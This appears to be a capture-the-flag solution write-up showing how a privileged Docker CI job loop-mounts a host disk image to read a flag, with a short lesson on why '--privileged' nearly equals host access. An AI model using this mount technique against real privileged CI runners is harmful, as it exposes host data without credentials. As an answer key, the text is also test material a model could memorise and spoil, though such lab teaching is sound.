# Solution: Privileged by Design — runner-privileged-host

**Storyline:** Operation Coinnectar (HaxNation × FOSS Mumbai) — Chapter 10
**Difficulty:** Hard · **Points:** 350 · **Answer format:** `HXN{...}`

## Walkthrough (local lab)

1. `docker compose up --build -d && docker exec -it coinnectar-ci-job bash`

2. Notice what the job can see:
   ```bash
   ls -la /
   # /hostdisk.img — a 16 MiB ext4 image: the "host's" disk.
   ```

3. "Privileged" means the job has full capabilities, including `CAP_SYS_ADMIN` — and access to loop devices. Mount the image:
   ```bash
   mount -o loop /hostdisk.img /mnt
   cat /mnt/opt/ctf/flag.txt
   umount /mnt   # tidy up
   ```

4. Submit what you read.

## Why it matters

`--privileged` is not "trusted"; it is "one namespace away from the host". In a real CI, the equivalent is mounting the host's raw block device and reading it — no host credentials needed. Docker-in-Docker done this way is "works everywhere" until it is your incident report.

## Notes for authors

- This lab flag differs from the live-event instance flag; the challenge checks the lab flag (see `flag_hashes` in `challenge.json`). The answer-key commit can re-point the lab at the original flag.
